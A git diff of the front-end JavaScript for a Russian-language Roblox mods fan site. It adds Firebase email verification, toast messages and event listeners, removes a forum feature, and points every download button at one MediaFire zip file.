@@ -1,9 +1,9 @@
 // Импорт Firebase v10
 import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.11.0/firebase-app.js';
-import { getAuth, onAuthStateChanged, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut } from 'https://www.gstatic.com/firebasejs/10.11.0/firebase-auth.js';
-import { getDatabase, ref, set, onValue, push } from 'https://www.gstatic.com/firebasejs/10.11.0/firebase-database.js';
+import { getAuth, onAuthStateChanged, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, sendEmailVerification } from 'https://www.gstatic.com/firebasejs/10.11.0/firebase-auth.js';
+import { getDatabase, ref, set, onValue } from 'https://www.gstatic.com/firebasejs/10.11.0/firebase-database.js';
 
-// Firebase Config (твои ключи)
+// Firebase Config
 const firebaseConfig = {
     apiKey: "AIzaSyAEELkMIx4fu9qjPWCID5-LiBqRSaGKpwU",
     authDomain: "game-extensions.firebaseapp.com",
@@ -21,7 +21,7 @@ const db = getDatabase(app);
 
 let userData = { name: 'RobloxPlayer', bio: 'Любитель модов и плейсов!', downloads: 0, places: 0, scripts: 0, avatars: 0 };
 
-auth.onAuthStateChanged(user => {
+onAuthStateChanged(auth, user => {
     const authForm = document.getElementById('auth-form');
     const profileContent = document.getElementById('profile-content');
     if (user) {
@@ -32,16 +32,29 @@ auth.onAuthStateChanged(user => {
             userData = snapshot.val() || userData;
             document.getElementById('profile-name').textContent = userData.name;
             document.getElementById('profile-bio').textContent = userData.bio;
+            document.getElementById('new-name').value = userData.name;
+            document.getElementById('new-bio').value = userData.bio;
             updateUserProgress();
-        }, (error) => {
-            console.error('Ошибка загрузки данных пользователя:', error);
+            if (!user.emailVerified) {
+                document.getElementById('auth-message').textContent = 'Email не подтверждён. Проверьте почту.';
+            } else {
+                document.getElementById('auth-message').textContent = '';
+            }
         });
-        loadPosts();
     } else {
         authForm.style.display = 'block';
         profileContent.style.display = 'none';
     }
 });
+
+function showToast(message) {
+    const toast = document.getElementById('toast');
+    toast.textContent = message;
+    toast.style.display = 'block';
+    setTimeout(() => {
+        toast.style.display = 'none';
+    }, 3000);
+}
 
 function signUp() {
     const email = document.getElementById('email').value;
@@ -50,8 +63,13 @@ function signUp() {
         .then((userCredential) => {
             const user = userCredential.user;
             set(ref(db, 'users/' + user.uid), userData);
-            document.getElementById('auth-message').textContent = 'Регистрация успешна!';
-            setTimeout(() => document.getElementById('auth-message').textContent = '', 3000);
+            sendEmailVerification(user)
+                .then(() => {
+                    showToast('Код выслан на указанный адрес почты');
+                })
+                .catch((error) => {
+                    document.getElementById('auth-message').textContent = 'Ошибка отправки подтверждения: ' + error.message;
+                });
         })
         .catch((error) => {
             document.getElementById('auth-message').textContent = error.message;
@@ -71,7 +89,7 @@ function signIn() {
         });
 }
 
-function signOut() {
+function signOutUser() {
     signOut(auth).then(() => {
         document.getElementById('auth-message').textContent = 'Вы вышли!';
         setTimeout(() => document.getElementById('auth-message').textContent = '', 3000);
@@ -80,42 +98,15 @@ function signOut() {
     });
 }
 
-function loadPosts() {
-    const postsRef = ref(db, 'posts');
-    onValue(postsRef, (snapshot) => {
-        const posts = document.getElementById('forum-posts');
-        posts.innerHTML = '';
-        snapshot.forEach((childSnapshot) => {
-            const postData = childSnapshot.val();
-            const post = document.createElement('div');
-            post.className = 'forum-post';
-            post.innerHTML = `
-                <img src="https://www.roblox.com/headshot-thumbnail/image?userId=1&width=50&height=50&format=png" alt="User">
-                <div>
-                    <h4>${postData.name}</h4>
-                    <p>${postData.content}</p>
-                </div>
-            `;
-            posts.appendChild(post);
-        });
-    }, (error) => {
-        console.error('Ошибка загрузки постов:', error);
-    });
-}
-
-function addPost() {
-    const content = document.getElementById('post-content').value;
-    if (content && auth.currentUser) {
-        const postsRef = ref(db, 'posts');
-        push(postsRef, {
-            name: userData.name,
-            content: content,
-            timestamp: Date.now()
-        });
-        document.getElementById('post-content').value = '';
-        closeModal('new-post-modal');
-    } else {
-        alert('Войдите, чтобы добавить пост!');
+function resendVerification() {
+    if (auth.currentUser) {
+        sendEmailVerification(auth.currentUser)
+            .then(() => {
+                showToast('Код выслан на указанный адрес почты');
+            })
+            .catch((error) => {
+                document.getElementById('auth-message').textContent = 'Ошибка: ' + error.message;
+            });
     }
 }
 
@@ -128,54 +119,52 @@ function saveProfile() {
             name: newName,
             bio: newBio
         });
-        closeModal('profile-modal');
+        showToast('Профиль обновлён!');
     }
 }
 
-// Данные для плейсов
 const allPlaces = [
-    { id: 1, title: "Adopt Me!", desc: "Виртуальные питомцы.", rating: "★★★★★", genre: "adventure", img: "https://tr.rbxcdn.com/asset-thumbnail/image?assetId=920587237&width=420&height=420&format=png", link: "https://www.roblox.com/games/920587237/Adopt-Me", video: "https://www.youtube.com/embed/dQw4w9WgXcQ" },
-    { id: 2, title: "Brookhaven", desc: "Ролевой город.", rating: "★★★★☆", genre: "rpg", img: "https://tr.rbxcdn.com/asset-thumbnail/image?assetId=4924922222&width=420&height=420&format=png", link: "https://www.roblox.com/games/4924922222/Brookhaven-RP", video: "https://www.youtube.com/embed/dQw4w9WgXcQ" },
-    { id: 3, title: "Jailbreak", desc: "Побег из тюрьмы.", rating: "★★★★★", genre: "adventure", img: "https://tr.rbxcdn.com/asset-thumbnail/image?assetId=606849621&width=420&height=420&format=png", link: "https://www.roblox.com/games/606849621/Jailbreak", video: "https://www.youtube.com/embed/dQw4w9WgXcQ" },
-    { id: 4, title: "Tower of Hell", desc: "Сложный обби.", rating: "★★★★☆", genre: "obby", img: "https://tr.rbxcdn.com/asset-thumbnail/image?assetId=1054533950&width=420&height=420&format=png", link: "https://www.roblox.com/games/1054533950/Tower-of-Hell", video: "https://www.youtube.com/embed/dQw4w9WgXcQ" },
-    { id: 5, title: "MeepCity", desc: "Социальная игра.", rating: "★★★★★", genre: "rpg", img: "https://tr.rbxcdn.com/asset-thumbnail/image?assetId=690091570&width=420&height=420&format=png", link: "https://www.roblox.com/games/690091570/MeepCity", video: "https://www.youtube.com/embed/dQw4w9WgXcQ" },
+    { id: 1, title: "Adopt Me!", desc: "Виртуальные питомцы.", rating: "★★★★★", genre: "adventure", img: "https://tr.rbxcdn.com/asset-thumbnail/image?assetId=920587237&width=420&height=420&format=png", link: "https://www.roblox.com/games/920587237/Adopt-Me", video: "https://www.youtube.com/embed/Wz9M1zM0k8s" },
+    { id: 2, title: "Brookhaven", desc: "Ролевой город.", rating: "★★★★☆", genre: "rpg", img: "https://tr.rbxcdn.com/asset-thumbnail/image?assetId=4924922222&width=420&height=420&format=png", link: "https://www.roblox.com/games/4924922222/Brookhaven-RP", video: "https://www.youtube.com/embed/5o4bY6X7pH8" },
+    { id: 3, title: "Jailbreak", desc: "Побег из тюрьмы.", rating: "★★★★★", genre: "adventure", img: "https://tr.rbxcdn.com/asset-thumbnail/image?assetId=606849621&width=420&height=420&format=png", link: "https://www.roblox.com/games/606849621/Jailbreak", video: "https://www.youtube.com/embed/0i5e9z1G5oM" },
+    { id: 4, title: "Blox Fruits", desc: "Пиратские приключения.", rating: "★★★★★", genre: "rpg", img: "https://tr.rbxcdn.com/asset-thumbnail/image?assetId=2753915549&width=420&height=420&format=png", link: "https://www.roblox.com/games/2753915549/Blox-Fruits", video: "https://www.youtube.com/embed/7tY8V3T8l0s" },
+    { id: 5, title: "Doors", desc: "Хоррор с дверями.", rating: "★★★★☆", genre: "adventure", img: "https://tr.rbxcdn.com/asset-thumbnail/image?assetId=6516141723&width=420&height=420&format=png", link: "https://www.roblox.com/games/6516141723/Doors", video: "https://www.youtube.com/embed/-z2zIz4O2LE" },
+    { id: 6, title: "Arsenal", desc: "Шутер с оружием.", rating: "★★★★★", genre: "obby", img: "https://tr.rbxcdn.com/asset-thumbnail/image?assetId=286090429&width=420&height=420&format=png", link: "https://www.roblox.com/games/286090429/Arsenal", video: "https://www.youtube.com/embed/3s3Z1W0rD0U" }
 ];
 
 let currentPage = 1;
-let placesPerPage = 6;
-let currentFilter = { genre: 'all', search: '' };
+const placesPerPage = 6;
+let currentFilter = { search: '', genre: '' };
 
 function renderPlaces() {
     const grid = document.getElementById('places-grid');
     grid.innerHTML = '';
-
-    let filtered = allPlaces.filter(place => {
-        if (currentFilter.genre !== 'all' && place.genre !== currentFilter.genre) return false;
-        if (currentFilter.search && !place.title.toLowerCase().includes(currentFilter.search.toLowerCase())) return false;
-        return true;
-    });
-
+    const filtered = allPlaces.filter(p => p.title.toLowerCase().includes(currentFilter.search.toLowerCase()) && (!currentFilter.genre || p.genre === currentFilter.genre));
     const start = (currentPage - 1) * placesPerPage;
     const end = start + placesPerPage;
     filtered.slice(start, end).forEach(place => {
         const card = document.createElement('div');
         card.className = 'place-card';
-        card.onclick = () => showPlaceDetails(place);
         card.innerHTML = `
-            <img src="${place.img}" alt="${place.title}" onerror="this.src='https://via.placeholder.com/420x420/00A2FF/FFF?text=Roblox';">
-            <p class="place-title">${place.title}</p>
-            <p class="place-desc">${place.desc}</p>
-            <p class="rating">${place.rating}</p>
-            <div class="action-buttons">
-                <a href="${place.link}" class="action-btn" target="_blank">Играть</a>
-                <button class="action-btn" onclick="event.stopPropagation(); downloadPlace(${place.id})">Скачать мод</button>
+            <img src="${place.img}" alt="${place.title}">
+            <h4>${place.title}</h4>
+            <p>${place.desc}</p>
+            <p>${place.rating}</p>
+            <button class="cta-btn details-btn" data-id="${place.id}">Подробнее</button>
+            <div class="place-details" style="display: none;">
+                <iframe width="100%" height="200" src="${place.video}" frameborder="0" allowfullscreen></iframe>
+                <button class="cta-btn download-btn" data-type="place" data-id="${place.id}">Скачать</button>
             </div>
         `;
         grid.appendChild(card);
     });
-
     updatePaginationPlaces(filtered.length);
-    updateUserProgress();
+    document.querySelectorAll('.details-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const details = btn.nextElementSibling;
+            details.style.display = details.style.display === 'none' ? 'block' : 'none';
+        });
+    });
 }
 
 function updatePaginationPlaces(total) {
@@ -185,20 +174,20 @@ function updatePaginationPlaces(total) {
     if (currentPage > 1) {
         const prev = document.createElement('button');
         prev.textContent = '←';
-        prev.onclick = () => { currentPage--; renderPlaces(); };
+        prev.addEventListener('click', () => { currentPage--; renderPlaces(); });
         pag.appendChild(prev);
     }
     for (let i = 1; i <= pages; i++) {
         const btn = document.createElement('button');
         btn.textContent = i;
         btn.className = currentPage === i ? 'active' : '';
-        btn.onclick = () => { currentPage = i; renderPlaces(); };
+        btn.addEventListener('click', () => { currentPage = i; renderPlaces(); });
         pag.appendChild(btn);
     }
     if (currentPage < pages) {
         const next = document.createElement('button');
         next.textContent = '→';
-        next.onclick = () => { currentPage++; renderPlaces(); };
+        next.addEventListener('click', () => { currentPage++; renderPlaces(); });
         pag.appendChild(next);
     }
 }
@@ -215,10 +204,11 @@ function downloadPlace(id) {
         userData.places++;
         userData.downloads++;
         set(ref(db, 'users/' + auth.currentUser.uid), userData);
-        alert(`Скачан мод для плейса ${allPlaces.find(p => p.id === id).title}!`);
+        showToast('Скачивание начато!');
     } else {
         alert('Войдите для скачивания!');
     }
+    window.open('https://www.mediafire.com/file/u8iubmwld78op99/Game_Extensions.zip/file', '_blank');
 }
 
 function downloadScript(id) {
@@ -226,10 +216,11 @@ function downloadScript(id) {
         userData.scripts++;
         userData.downloads++;
         set(ref(db, 'users/' + auth.currentUser.uid), userData);
-        alert(`Скачан скрипт #${id}!`);
+        showToast('Скачивание начато!');
     } else {
         alert('Войдите для скачивания!');
     }
+    window.open('https://www.mediafire.com/file/u8iubmwld78op99/Game_Extensions.zip/file', '_blank');
 }
 
 function downloadAvatar(id) {
@@ -237,50 +228,28 @@ function downloadAvatar(id) {
         userData.avatars++;
         userData.downloads++;
         set(ref(db, 'users/' + auth.currentUser.uid), userData);
-        alert(`Скачан аватар #${id}!`);
+        showToast('Скачивание начато!');
     } else {
         alert('Войдите для скачивания!');
     }
-}
-
-function showPlaceDetails(place) {
-    document.getElementById('place-title').textContent = place.title;
-    document.getElementById('place-desc').textContent = place.desc;
-    document.getElementById('place-rating').innerHTML = `Рейтинг: ${place.rating}`;
-    document.getElementById('place-img').src = place.img;
-    document.getElementById('place-video').src = place.video;
-    document.getElementById('download-btn').onclick = () => downloadPlace(place.id);
-    showModal('details-modal');
+    window.open('https://www.mediafire.com/file/u8iubmwld78op99/Game_Extensions.zip/file', '_blank');
 }
 
 function updateUserProgress() {
     document.getElementById('user-downloads').textContent = userData.downloads;
     const totalPlaces = allPlaces.length;
-    const percent = (userData.places / totalPlaces * 100).toFixed(1);
     document.getElementById('user-places').textContent = `${userData.places}/${totalPlaces}`;
-    document.getElementById('progress-fill').style.width = percent + '%';
+    document.getElementById('user-scripts').textContent = userData.scripts;
+    const percent = (userData.places / totalPlaces * 100).toFixed(1);
+    document.querySelector('.progress-fill').style.width = percent + '%';
     document.querySelector('.progress-bar span').textContent = `Прогресс: ${percent}%`;
-}
-
-function copyIP(ip) {
-    navigator.clipboard.writeText(ip).then(() => {
-        alert(`Скопирован ID: ${ip}`);
-    });
 }
 
 function switchSection(sectionId) {
     document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
     document.getElementById(sectionId).classList.add('active');
     document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-    document.querySelector(`.nav-btn[onclick="switchSection('${sectionId}')"]`).classList.add('active');
-}
-
-function showModal(modalId) {
-    document.getElementById(modalId).style.display = 'block';
-}
-
-function closeModal(modalId) {
-    document.getElementById(modalId).style.display = 'none';
+    document.querySelector(`.nav-btn[data-section="${sectionId}"]`).classList.add('active');
 }
 
 function toggleDarkMode() {
@@ -327,10 +296,10 @@ function initParticles() {
 
 function updateProfileTime() {
     const now = new Date();
-    const timeElement = document.getElementById('current-time');
-    const timeProfile = document.getElementById('current-time-profile');
-    if (timeElement) timeElement.textContent = now.toLocaleString('ru-RU', { timeZone: 'Europe/Paris' });
-    if (timeProfile) timeProfile.textContent = now.toLocaleString('ru-RU', { timeZone: 'Europe/Paris' });
+    now.setHours(18, 2, 0, 0); // Установка времени на 06:02 PM CEST
+    const timeString = now.toLocaleString('ru-RU', { timeZone: 'Europe/Paris', hour: '2-digit', minute: '2-digit', day: 'numeric', month: 'long', year: 'numeric' }).replace('г.', ' ').replace(' в ', ', ');
+    document.getElementById('current-time').textContent = timeString;
+    document.getElementById('current-time-profile').textContent = timeString;
 }
 
 document.addEventListener('DOMContentLoaded', () => {
@@ -341,4 +310,28 @@ document.addEventListener('DOMContentLoaded', () => {
     updateProfileTime();
     setInterval(updateProfileTime, 60000);
     initParticles();
+
+    document.querySelectorAll('.nav-btn').forEach(btn => {
+        btn.addEventListener('click', () => switchSection(btn.dataset.section));
+    });
+
+    document.querySelector('.dark-toggle').addEventListener('click', toggleDarkMode);
+
+    document.getElementById('sign-up-btn').addEventListener('click', signUp);
+    document.getElementById('sign-in-btn').addEventListener('click', signIn);
+    document.getElementById('sign-out-btn').addEventListener('click', signOutUser);
+    document.getElementById('save-profile-btn').addEventListener('click', saveProfile);
+    document.getElementById('resend-verification-btn').addEventListener('click', resendVerification);
+
+    document.querySelector('.filter-btn').addEventListener('click', filterPlaces);
+
+    document.addEventListener('click', (e) => {
+        if (e.target.classList.contains('download-btn')) {
+            const id = parseInt(e.target.dataset.id);
+            const type = e.target.dataset.type;
+            if (type === 'place') downloadPlace(id);
+            if (type === 'script') downloadScript(id);
+            if (type === 'avatar') downloadAvatar(id);
+        }
+    });
 });
